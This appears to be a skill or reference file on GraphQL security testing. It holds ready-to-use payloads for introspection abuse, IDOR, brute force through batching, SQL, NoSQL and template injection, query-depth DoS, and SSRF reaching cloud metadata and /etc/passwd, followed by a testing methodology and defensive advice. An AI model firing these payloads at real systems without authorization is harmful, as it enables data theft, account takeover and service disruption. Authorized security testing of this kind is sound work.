---
name: graphql-attacks
description: GraphQL security testing covering introspection abuse, injection, batching attacks, and authorization bypass
---

# GraphQL Attacks

GraphQL exposes a single endpoint that can be abused for data exposure, injection, DoS, and authorization bypass. Its flexible query language means a single endpoint with insufficient controls can leak the entire schema and allow querying unauthorized data across multiple object types.

## Attack Surface

**Common Endpoints**
- `/graphql`, `/graphiql`, `/api/graphql`, `/query`, `/gql`
- POST with `Content-Type: application/json`
- GET with `?query=...` parameter
- WebSocket (`ws://`) for subscriptions

**Entry Points**
- Query arguments (scalar types, enum inputs)
- Mutation input objects
- Subscription filters
- Directive arguments
- Fragment spreads on polymorphic types

## Key Vulnerabilities

### Introspection Exposure

Full schema disclosure via introspection query:
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name kind } }
      }
    }
  }
}
```

Minimal version when full is blocked:
```graphql
{ __schema { queryType { name } } }
{ __type(name: "User") { fields { name } } }
```

Tool: `clairvoyance` — recovers schema even when introspection is disabled via field name brute-forcing.

### Field Suggestion Leakage

Even with introspection disabled, GraphQL returns "Did you mean X?" suggestions on typos:
```graphql
{ usr { emailAddres } }
# Response: "Did you mean 'emailAddress'?"
```

Use `clairvoyance` or manual fuzzing to map schema via suggestions.

### Authorization Bypass (BOLA/IDOR)

```graphql
# Access another user's data
query { user(id: "VICTIM_ID") { email, privateData, paymentMethods } }

# Nested object traversal
query { order(id: "X") { customer { admin, internalNotes, ssn } } }

# Alias-based parallel enumeration
query {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  ...
}
```

### Mutation Authorization Bypass

```graphql
# Try admin mutations
mutation { deleteUser(id: "VICTIM") { success } }
mutation { updateRole(userId: "ME", role: "ADMIN") { success } }
mutation { createAdminAccount(email: "attacker@x.com", password: "X") { token } }
```

### Batching Attacks

**JSON Array Batching** (for brute force, bypassing rate limits)
```json
[
  {"query": "mutation { login(email:\"admin@x.com\", password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"admin@x.com\", password:\"pass2\") { token } }"},
  ...
]
```

**Alias Batching** (sends N queries in 1 HTTP request)
```graphql
mutation {
  a1: login(email:"admin@x.com", password:"pass1") { token }
  a2: login(email:"admin@x.com", password:"pass2") { token }
}
```

### GraphQL Injection

**SQL Injection via arguments**
```graphql
{ users(filter: "1=1 UNION SELECT username,password FROM users--") { name } }
{ search(query: "' OR 1=1--") { results } }
```

**NoSQL Injection**
```graphql
{ user(id: "{\"$gt\": \"\"}") { email } }
```

**SSTI via resolvers**
```graphql
mutation { updateProfile(bio: "{{7*7}}") { bio } }
```

### Denial of Service

**Deep Query Nesting**
```graphql
{
  user {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}
```

**Circular Fragment Reference**
```graphql
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
{ user { ...A } }
```

**Field Duplication**
```graphql
{
  user { name name name name name name name name name name ... }
}
```

### SSRF via GraphQL

```graphql
mutation { fetchUrl(url: "http://169.254.169.254/latest/meta-data/") { content } }
query { importData(source: "file:///etc/passwd") { data } }
```

### Subscription Hijacking

```graphql
subscription { allMessages { content sender { id email } } }
subscription { orderUpdates(userId: "VICTIM_ID") { status total } }
```

### Persisted Query Abuse

Automatic Persisted Queries (APQ) may allow submitting previously-denied queries by hash:
```json
{"extensions": {"persistedQuery": {"version": 1, "sha256Hash": "KNOWN_HASH"}}}
```

## Bypass Techniques

**Introspection Bypass**
```graphql
# Lowercase type name
{ __SCHEMA { types { name } } }
# With spaces
{  __schema  { types { name } } }
# Via POST (when GET is blocked)
# Different Content-Type: application/graphql
```

**Field Aliasing to Bypass Rate Limits**
```graphql
{ a: sensitiveField, b: sensitiveField, c: sensitiveField }
```

**Directive Bypass**
```graphql
# When @skip/@include are checked for auth
query getAdmin @skip(if: false) { adminData { secrets } }
```

**Fragment Spreading for Hidden Fields**
```graphql
fragment F on User { internalId, rawPassword, adminFlag }
query { me { ...F } }
```

**Operaton Name Manipulation**
```
GET /graphql?operationName=allowed&query={malicious}
```

## Testing Methodology

1. **Discover endpoint** — `/.well-known/graphql`, `/graphql`, `/api/graphql`, GraphQL IDE exposure
2. **Run introspection** — Full `__schema` query; use `graphql-voyager` to visualize
3. **Schema mapping if blocked** — `clairvoyance` for field brute-forcing; exploit suggestions
4. **Authorization testing** — Access every type/field as low-priv user; test horizontal/vertical IDOR
5. **Mutation testing** — Try all mutations, especially admin/delete/role-change operations
6. **Batching** — Test array batching and alias batching for rate-limit bypass
7. **Injection** — Test string arguments for SQLi, NoSQLi, SSTI, command injection
8. **DoS** — Test nesting depth, circular fragments, field duplication
9. **Subscription** — Enumerate subscriptions, test for cross-user data leakage
10. **SSRF** — Test URL-accepting fields

## Validation

1. Demonstrate schema exposure via introspection or field suggestion leakage
2. Show IDOR by accessing another user's data with their ID
3. For batching abuse, show N operations completing in 1 HTTP request bypassing rate limits
4. For injection, demonstrate data extraction or error leakage

## False Positives

- Introspection returning only allowed types with no sensitive data
- Object-level auth correctly returning errors on unauthorized IDs
- Rate limiting applied per-alias/batch operation count, not per HTTP request

## Impact

- Full schema disclosure enabling targeted attacks
- Mass data extraction via IDOR/missing auth on fields
- Account takeover via credential stuffing through batching
- DoS through expensive uncapped queries

## Pro Tips

1. Always check both GET and POST methods — different middleware may block one but not the other
2. `graphql-cop` tool automates GraphQL security testing
3. Check for GraphQL IDE (GraphiQL, Playground) exposed in production
4. Batch brute-forcing in 1 request often bypasses rate limiting designed for HTTP-level
5. Resolvers calling microservices inherit their SSRF/injection vulnerabilities
6. Look for `extensions` field in responses — can leak resolver stack traces
7. Nested queries may bypass field-level auth checks applied only at top level
8. Try all CRUD mutations on objects you can read — create/update/delete auth often inconsistent
9. `__typename` always works even when introspection is disabled — use it to map types

## Summary

GraphQL's flexibility is its attack surface. Introspection, batching, and single-endpoint design make it easy to enumerate data and bypass controls designed for traditional REST APIs. Test authorization at every resolver, cap query depth/complexity, and disable introspection in production.
